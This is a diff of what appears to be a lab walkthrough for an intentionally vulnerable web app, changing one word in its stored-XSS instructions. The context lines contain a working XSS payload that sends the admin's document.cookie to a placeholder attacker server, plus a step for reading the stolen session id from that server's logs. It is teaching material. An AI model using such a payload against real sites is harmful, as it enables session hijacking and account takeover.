@@ -60,7 +60,7 @@ The XSS code can be entered on the SignUp page, and executed on the Admin page w
 
    ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 
-2. Log in to the Admin pages and take a look at the sign-ups. The session-id should now be written to the Apache logs of “yourserver” (cat /var/log/apache2/access.log). 
+2. Go to the Admin pages and take a look at the sign-ups. The session-id should now be written to the Apache logs of “yourserver” (cat /var/log/apache2/access.log). 
 
 But you can also test with code like this, in any of the fields on the SignUp page; 
 
